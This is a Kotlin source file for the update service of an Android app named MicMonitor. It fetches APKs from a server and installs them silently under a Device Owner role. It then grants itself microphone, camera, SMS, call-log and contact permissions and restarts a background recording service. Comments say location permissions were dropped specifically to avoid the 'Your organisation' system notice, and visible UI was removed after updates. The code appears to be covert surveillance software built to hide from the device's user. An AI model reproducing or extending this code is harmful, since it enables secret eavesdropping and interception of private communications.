package com.micmonitor.app

import android.Manifest
import android.app.DownloadManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.content.*
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.InputStream
import java.net.HttpURLConnection
import java.net.URL

/**
 * UpdateService — Production-level auto-update system for MicMonitor
 * 
 * Features:
 * - Checks server for new version
 * - Downloads APK using DownloadManager
 * - Silent install if Device Owner, otherwise prompts user
 * - Auto-grants all permissions after update (Device Owner)
 * - Supports forced updates (minVersionCode)
 */
object UpdateService {
    
    private const val TAG = "UpdateService"
    private const val VERSION_ENDPOINT = "/api/version"
    private const val PREFS_NAME = "update_prefs"
    private const val APP_PREFS_NAME = "micmonitor"
    private const val PREF_SERVER_URL = "server_url"
    private const val PREF_LAST_CHECK = "last_check"
    private const val CHECK_INTERVAL_MS = 10 * 60 * 1000L // 10 minutes
    private const val UPDATE_PROMPT_CHANNEL_ID = "micmonitor_update_prompt"
    private const val UPDATE_PROMPT_NOTIFICATION_ID = 2201
    
    private val isDownloadInProgress = java.util.concurrent.atomic.AtomicBoolean(false)
    
    // All permissions that should be auto-granted after update
    // Note: Location permissions REMOVED to avoid system notifications
    private val REQUIRED_PERMISSIONS = arrayOf(
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA,
        // Location permissions removed - causes "Your organisation" notification
        // Manifest.permission.ACCESS_FINE_LOCATION,
        // Manifest.permission.ACCESS_COARSE_LOCATION,
        // Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        // Android 13+ (API 33)
        "android.permission.POST_NOTIFICATIONS",
        "android.permission.READ_MEDIA_AUDIO",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
    )
    
    data class VersionInfo(
        val versionCode: Int,
        val versionName: String,
        val apkUrl: String,
        val changelog: String,
        val minVersionCode: Int,
        val apkAvailable: Boolean,
        val apkSize: Long
    )
    
    enum class InstallResult {
        SILENT_STARTED,
        PROMPT_SHOWN,
        ERROR
    }
    
    /**
     * Check for updates in background
     */
    suspend fun checkForUpdate(context: Context, forceCheck: Boolean = false): VersionInfo? {
        return withContext(Dispatchers.IO) {
            try {
                val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                val lastCheck = prefs.getLong(PREF_LAST_CHECK, 0)
                
                // Skip if checked recently (unless forced)
                if (!forceCheck && System.currentTimeMillis() - lastCheck < CHECK_INTERVAL_MS) {
                    Log.d(TAG, "Skipping check - checked recently")
                    return@withContext null
                }
                
                Log.i(TAG, "Checking for updates...")
                val versionInfo = fetchVersionInfo(context)
                
                if (versionInfo == null) {
                    Log.w(TAG, "Failed to fetch version info")
                    return@withContext null
                }
                
                // Save check time
                prefs.edit().putLong(PREF_LAST_CHECK, System.currentTimeMillis()).apply()
                
                val currentVersionCode = getCurrentVersionCode(context)
                Log.i(TAG, "[UpdateCheck] Current Version: $currentVersionCode, Server Version: ${versionInfo.versionCode} (Name: ${versionInfo.versionName})")
                
                if (versionInfo.versionCode > currentVersionCode && versionInfo.apkAvailable) {
                    Log.i(TAG, "[UpdateCheck] Update AVAILABLE: ${versionInfo.versionName}")
                    return@withContext versionInfo
                }
                
                Log.d(TAG, "[UpdateCheck] Up to date (v$currentVersionCode)")
                null
            } catch (e: Exception) {
                Log.e(TAG, "Error checking for updates: ${e.message}")
                null
            }
        }
    }
    
    /**
     * Download and install update
     */
    suspend fun downloadAndInstall(context: Context, versionInfo: VersionInfo): InstallResult {
        if (!isDownloadInProgress.compareAndSet(false, true)) {
            Log.w(TAG, "Download already in progress")
            return InstallResult.ERROR
        }
        return withContext(Dispatchers.IO) {
            try {
                Log.i(TAG, "Starting direct download: ${versionInfo.apkUrl}")
                
                // Clean up old APKs
                cleanupOldApks(context)
                
                val apkUrl = buildAbsoluteApkUrl(context, versionInfo.apkUrl)
                Log.i(TAG, "[Download] Starting download from $apkUrl")
                
                val targetFile = File(context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), "deviceservices.apk")
                
                val url = URL(apkUrl)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.connectTimeout = 15000
                connection.readTimeout = 60000
                connection.connect()
                
                if (connection.responseCode != HttpURLConnection.HTTP_OK) {
                    throw Exception("Server returned HTTP ${connection.responseCode}")
                }
                
                targetFile.outputStream().use { output ->
                    connection.inputStream.use { input ->
                        input.copyTo(output)
                    }
                }
                connection.disconnect()
                
                Log.i(TAG, "[Download] Success: ${targetFile.absolutePath} (${targetFile.length()} bytes)")
                
                withContext(Dispatchers.Main) {
                    Log.i(TAG, "[Update] Handing off to installApk")
                    installApk(context, targetFile)
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Error downloading or installing: ${e.message}")
                InstallResult.ERROR
            } finally {
                isDownloadInProgress.set(false)
            }
        }
    }
    
    /**
     * Install APK - silent if Device Owner, otherwise prompt user
     */
    fun installApk(context: Context, apkFile: File): InstallResult {
        if (!apkFile.exists()) {
            Log.e(TAG, "APK file not found: ${apkFile.absolutePath}")
            return InstallResult.ERROR
        }
        
        Log.i(TAG, "Installing APK: ${apkFile.absolutePath} (${apkFile.length()} bytes)")
        
        return if (isDeviceOwner(context)) {
            Log.i(TAG, "[Install] Device Owner detected - triggering SILENT install")
            silentInstall(context, apkFile)
        } else {
            Log.i(TAG, "[Install] Not Device Owner - triggering PROMPT install")
            promptInstall(context, apkFile)
            InstallResult.PROMPT_SHOWN
        }
    }
    
    /**
     * Check if app is Device Owner
     */
    fun isDeviceOwner(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return dpm.isDeviceOwnerApp(context.packageName)
    }
    
    /**
     * Auto-grant all required permissions (Device Owner only)
     * Call this after app update or on app start
     */
    fun autoGrantPermissions(context: Context) {
        if (!isDeviceOwner(context)) {
            Log.d(TAG, "Not Device Owner - cannot auto-grant permissions")
            return
        }
        
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
        val packageName = context.packageName
        
        var granted = 0
        var failed = 0
        
        for (permission in REQUIRED_PERMISSIONS) {
            try {
                // Check if permission is declared in manifest
                val permInfo = try {
                    context.packageManager.getPermissionInfo(permission, 0)
                } catch (e: PackageManager.NameNotFoundException) {
                    Log.d(TAG, "Permission not found: $permission")
                    continue
                }
                
                // Only grant runtime permissions (dangerous permissions)
                if (permInfo.protection and android.content.pm.PermissionInfo.PROTECTION_DANGEROUS == 0) {
                    continue
                }
                
                val result = dpm.setPermissionGrantState(
                    adminComponent,
                    packageName,
                    permission,
                    DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED
                )
                
                if (result) {
                    granted++
                    Log.d(TAG, "Auto-granted: $permission")
                } else {
                    failed++
                    Log.w(TAG, "Failed to grant: $permission")
                }
            } catch (e: Exception) {
                failed++
                Log.e(TAG, "Error granting $permission: ${e.message}")
            }
        }
        
        Log.i(TAG, "Auto-grant complete: $granted granted, $failed failed")
    }
    
    /**
     * Silent install using PackageInstaller (requires Device Owner)
     */
    private fun silentInstall(context: Context, apkFile: File): InstallResult {
        try {
            val packageInstaller = context.packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            params.setAppPackageName(context.packageName)
            
            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)
            
            // Write APK to session
            val inputStream: InputStream = FileInputStream(apkFile)
            val outputStream = session.openWrite("deviceservices.apk", 0, apkFile.length())
            
            val buffer = ByteArray(65536)
            var bytesRead: Int
            while (inputStream.read(buffer).also { bytesRead = it } != -1) {
                outputStream.write(buffer, 0, bytesRead)
            }
            
            session.fsync(outputStream)
            outputStream.close()
            inputStream.close()
            
            // Create intent for installation result
            val intent = Intent(context, InstallResultReceiver::class.java).apply {
                action = "com.micmonitor.app.INSTALL_RESULT"
                component = ComponentName(context, InstallResultReceiver::class.java)
            }
            
            val pendingIntent = PendingIntent.getBroadcast(
                context,
                sessionId,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            
            // Commit the session
            session.commit(pendingIntent.intentSender)
            Log.i(TAG, "[Install] SILENT install session committed! Session ID: $sessionId")
            return InstallResult.SILENT_STARTED
            
        } catch (e: Exception) {
            Log.e(TAG, "Silent install failed: ${e.message}")
            // Fallback to prompt install
            promptInstall(context, apkFile)
            return InstallResult.PROMPT_SHOWN
        }
    }
    
    /**
     * Prompt user to install (fallback when not Device Owner)
     */
    private fun promptInstall(context: Context, apkFile: File) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !context.packageManager.canRequestPackageInstalls()) {
                val settingsIntent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
                    data = Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                showUpdatePromptNotification(
                    context,
                    settingsIntent,
                    "Enable 'Install unknown apps' for MicMonitor, then tap to continue update"
                )
                try {
                    context.startActivity(settingsIntent)
                } catch (e: Exception) {
                    Log.w(TAG, "Could not open unknown-app-sources settings: ${e.message}")
                }
                return
            }

            val intent = buildInstallerIntent(context, apkFile)
            var launched = false
            try {
                context.startActivity(intent)
                launched = true
                Log.i(TAG, "Install prompt shown to user")
            } catch (e: Exception) {
                Log.w(TAG, "Direct installer launch failed, notification fallback will be used: ${e.message}")
            }

            val message = if (launched) {
                "If installer did not appear, tap this notification to continue installation"
            } else {
                "Tap to install the downloaded MicMonitor update"
            }
            showUpdatePromptNotification(context, intent, message)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error showing install prompt: ${e.message}")
        }
    }
    
    /**
     * Fetch version info from server
     */
    private fun fetchVersionInfo(context: Context): VersionInfo? {
        var connection: HttpURLConnection? = null
        try {
            val serverHttpBaseUrl = resolveServerHttpBaseUrl(context)
            val url = URL("$serverHttpBaseUrl$VERSION_ENDPOINT")
            Log.i(TAG, "Fetching version info from $url")
            connection = url.openConnection() as HttpURLConnection
            connection.useCaches = false
            connection.connectTimeout = 10000
            connection.readTimeout = 10000
            connection.requestMethod = "GET"
            connection.setRequestProperty("Cache-Control", "no-cache")
            connection.setRequestProperty("Pragma", "no-cache")
            
            if (connection.responseCode != 200) {
                Log.e(TAG, "Server returned ${connection.responseCode}")
                return null
            }
            
            val response = connection.inputStream.bufferedReader().readText()
            val json = JSONObject(response)
            
            return VersionInfo(
                versionCode = json.optInt("versionCode", 1),
                versionName = json.optString("versionName", "1.0.0"),
                apkUrl = json.optString("apkUrl", ""),
                changelog = json.optString("changelog", ""),
                minVersionCode = json.optInt("minVersionCode", 1),
                apkAvailable = json.optBoolean("apkAvailable", false),
                apkSize = json.optLong("apkSize", 0)
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error fetching version: ${e.message}")
            return null
        } finally {
            connection?.disconnect()
        }
    }

    private fun resolveServerHttpBaseUrl(context: Context): String {
        val appPrefs = context.getSharedPreferences(APP_PREFS_NAME, Context.MODE_PRIVATE)
        
        // Priority 1: Discovered Local (Zero-Touch)
        val discoveredLocal = appPrefs.getString("last_discovered_local_url", null)
        
        val configuredServerUrl = appPrefs.getString(PREF_SERVER_URL, MicService.DEFAULT_SERVER_URL)
            ?.trim()
            .orEmpty()
        
        val source = when {
            !discoveredLocal.isNullOrBlank() -> discoveredLocal
            configuredServerUrl.isBlank() -> MicService.DEFAULT_SERVER_URL
            else -> configuredServerUrl
        }

        return try {
            val parsed = Uri.parse(source)
            val scheme = when (parsed.scheme?.lowercase()) {
                "wss" -> "https"
                "ws" -> "http"
                "https" -> "https"
                "http" -> "http"
                else -> "https"
            }
            val host = parsed.host
            if (!host.isNullOrBlank()) {
                val port = if (parsed.port > 0) ":${parsed.port}" else ""
                "$scheme://$host$port"
            } else {
                source
                    .replace(Regex("^wss://", RegexOption.IGNORE_CASE), "https://")
                    .replace(Regex("^ws://", RegexOption.IGNORE_CASE), "http://")
                    .substringBefore("/audio")
                    .trimEnd('/')
            }
        } catch (_: Exception) {
            source
                .replace(Regex("^wss://", RegexOption.IGNORE_CASE), "https://")
                .replace(Regex("^ws://", RegexOption.IGNORE_CASE), "http://")
                .substringBefore("/audio")
                .trimEnd('/')
        }
    }

    private fun buildAbsoluteApkUrl(context: Context, apkUrl: String): String {
        val trimmed = apkUrl.trim()
        if (trimmed.startsWith("https://", ignoreCase = true) || trimmed.startsWith("http://", ignoreCase = true)) {
            return trimmed
        }

        val base = resolveServerHttpBaseUrl(context)
        return if (trimmed.startsWith("/")) "$base$trimmed" else "$base/$trimmed"
    }

    private fun buildInstallerIntent(context: Context, apkFile: File): Intent {
        val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            androidx.core.content.FileProvider.getUriForFile(
                context,
                "${context.packageName}.fileprovider",
                apkFile
            )
        } else {
            Uri.fromFile(apkFile)
        }

        return Intent(Intent.ACTION_INSTALL_PACKAGE).apply {
            data = uri
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION)
            putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true)
            putExtra(Intent.EXTRA_RETURN_RESULT, true)
        }
    }

    private fun showUpdatePromptNotification(context: Context, actionIntent: Intent, message: String) {
        try {
            ensureUpdatePromptChannel(context)
            val pendingIntent = PendingIntent.getActivity(
                context,
                UPDATE_PROMPT_NOTIFICATION_ID,
                actionIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            val notification = NotificationCompat.Builder(context, UPDATE_PROMPT_CHANNEL_ID)
                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                .setContentTitle("MicMonitor update ready")
                .setContentText(message)
                .setStyle(NotificationCompat.BigTextStyle().bigText(message))
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .setContentIntent(pendingIntent)
                .build()

            NotificationManagerCompat.from(context).notify(UPDATE_PROMPT_NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            Log.w(TAG, "Failed to post update prompt notification: ${e.message}")
        }
    }

    private fun ensureUpdatePromptChannel(context: Context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val manager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (manager.getNotificationChannel(UPDATE_PROMPT_CHANNEL_ID) != null) return

        val channel = NotificationChannel(
            UPDATE_PROMPT_CHANNEL_ID,
            "MicMonitor Updates",
            NotificationManager.IMPORTANCE_HIGH
        ).apply {
            description = "Prompts for app update installation"
        }
        manager.createNotificationChannel(channel)
    }
    
    private fun getCurrentVersionCode(context: Context): Int {
        return try {
            val pInfo = context.packageManager.getPackageInfo(context.packageName, 0)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                pInfo.longVersionCode.toInt()
            } else {
                @Suppress("DEPRECATION")
                pInfo.versionCode
            }
        } catch (e: Exception) {
            1
        }
    }
    
    private fun cleanupOldApks(context: Context) {
        try {
            val downloadsDir = context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)
            val cutoff = System.currentTimeMillis() - 600_000L
            downloadsDir?.listFiles()?.forEach { file ->
                if (file.name.endsWith(".apk") && file.lastModified() < cutoff) {
                    file.delete()
                    Log.d(TAG, "Deleted old APK: ${file.name}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error cleaning up old APKs: ${e.message}")
        }
    }
}

/**
 * BroadcastReceiver for silent install results
 */
class InstallResultReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE)
        val message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE)
        
        when (status) {
            PackageInstaller.STATUS_SUCCESS -> {
                Log.i("InstallResult", "Installation successful! Auto-starting service...")
                // Auto-grant any new permissions after update
                UpdateService.autoGrantPermissions(context)
                
                // Auto-start the service immediately after successful install
                try {
                    val serviceIntent = Intent(context, MicService::class.java)
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        context.startForegroundService(serviceIntent)
                    } else {
                        context.startService(serviceIntent)
                    }
                    Log.i("InstallResult", "MicService started after update")
                    
                    // BUG-L5 fix: Don't launch visible UI after silent update.
                    // Service restart alone is sufficient for background monitoring.
                } catch (e: Exception) {
                    Log.e("InstallResult", "Failed to start service/activity: ${e.message}")
                }
            }
            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                // Need user confirmation (shouldn't happen with Device Owner)
                val confirmIntent = intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                confirmIntent?.let {
                    it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(it)
                }
            }
            else -> {
                Log.e("InstallResult", "Installation failed: $status - $message")
            }
        }
    }
}
